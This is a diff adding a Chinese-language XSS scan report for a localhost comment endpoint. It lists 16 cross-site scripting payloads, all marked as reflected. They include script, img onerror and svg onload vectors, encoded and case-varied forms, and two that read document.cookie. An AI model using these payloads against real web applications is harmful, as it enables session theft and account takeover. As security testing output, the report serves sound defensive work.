@@ -1,0 +1,58 @@
+XSS测试报告
+==================================================
+目标URL: http://localhost:5000/comment
+测试时间: Mon Oct 27 22:25:22 2025
+测试载荷: 16 个
+发现漏洞: 16 个
+成功率: 100.0%
+
+有效载荷:
+- <script>alert('XSS')</script>
+  原因: 载荷反射
+
+- <img src=x onerror=alert('XSS')>
+  原因: 载荷反射
+
+- <svg onload=alert('XSS')>
+  原因: 载荷反射
+
+- <body onload=alert('XSS')>
+  原因: 载荷反射
+
+- <iframe src="javascript:alert('XSS')">
+  原因: 载荷反射
+
+- %3Cscript%3Ealert('XSS')%3C/script%3E
+  原因: 载荷反射
+
+- %3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E
+  原因: 载荷反射
+
+- &lt;script&gt;alert('XSS')&lt;/script&gt;
+  原因: 载荷反射
+
+- <ScRiPt>alert('XSS')</ScRiPt>
+  原因: 载荷反射
+
+- <img src=x onerror=alert`1`>
+  原因: 载荷反射
+
+- <svg/onload=alert(1)>
+  原因: 载荷反射
+
+- javascript:alert('XSS')
+  原因: 载荷反射
+
+- <script>alert(document.cookie)</script>
+  原因: 载荷反射
+
+- <img src=x onerror=alert(document.cookie)>
+  原因: 载荷反射
+
+- <script
+alert('XSS')</script>
+  原因: 载荷反射
+
+- <script>alert(String.fromCharCode(88,83,83))</script>
+  原因: 载荷反射
+
